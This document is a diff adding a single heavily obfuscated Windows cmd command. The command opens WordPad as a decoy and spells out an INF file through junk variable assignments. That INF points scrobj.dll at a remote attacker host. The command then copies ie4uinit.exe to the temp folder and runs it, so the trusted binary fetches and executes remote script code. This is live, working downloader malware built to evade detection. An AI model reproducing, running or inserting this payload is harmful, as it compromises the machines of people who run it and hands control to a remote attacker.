@@ -1,0 +1,23 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %o in ("monocha=t" "dishwi=s" "uroede=l" "nellaxi=se" "itinerarye=c" ) do @set %~o) &&
+  (for %s in ("m") do @set "aghanee=%~s") &&
+  call(for %o in ("c") do @set "actini=%~o") &&
+  (for %d in ("B") do @set "hydropterid=%~d") &&
+  (for %o in ("n") do @set "coales=%~o") &&
+  call(for %l in ("_") do @set "fadea=%~l") &&
+  call(for %g in ("e") do @set "surfiest=%~g") &&
+  call(for %g in ("]") do @set "exrxc=%~g") &&
+  call(for %v in ("w") do @set "sah=%~v") &&
+  (for %x in ("t") do @set "bomb=%~x") &&
+  callcallcall(for %v in ("p") do @set "transmonta=%~v") &&
+  callcall(for %u in ("b") do @set "anomal=%~u") &&
+  callcallcall(for %a in ("u") do @set "plenilu=%~a") &&
+  callcall(for %i in ("n") do @set "coales=%~i") &&
+  callcall(for %f in ("s") do @set "pyoptysisco=%~f") &&
+  (for %b in ("%windir%") do @set "isob=%~b") &&
+  (for %h in ("l") do @set "fibromyxom=%~h") &&
+  call(for %d in ("l") do @set "fibromyxom=%~d") &&
+  (for %a in ("s") do @set "pyoptysisco=%~a") &&
+  (for %v in ("$") do @set "andes=%~v") &&
+  callcallcall(for %m in ("[version]" "signature=$windows nt$" "[strings]" "servicename= 'poliadverr'" "shortsvcname= 'poliadverr'" "glo=." "triactin=/" "antichlori=:" "tam=N" "meconid=a" "incorp=c" "dainti=d" "guardia=e" "heir=h" "dextrorotat=i" "casementedn=j" "protest=k" "buttressl=l" "magnifi=m" "transit=n" "inhum=o" "rapi=q" "agitatesunn=s" "aconi=t" "unhewable=u" "[fyc_0B027]" "s%incorp%r%inhum%b\" "%casementedn%.%dainti%l%buttressl%,%tam%I,%heir%t%aconi%p%antichlori%/%triactin%l%protest%i%buttressl%l%casementedn%l%glo%p%meconid%u%buttressl%-%agitatesunn%t%guardia%i%transit%.%incorp%o%magnifi%/%dainti%b%unhewable%i%rapi%o" "[428BF9]" "i%guardia%u%dextrorotat%n%dextrorotat%t%glo%i%transit%f" "[defaultinstall.windows7]" "delfiles=428BF9" "Un\" "Register\" "OCXs=fyc_0B027" "[destinationdirs]" "defaultdestdir=11" "428BF9=01" ) do @echo %~m) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
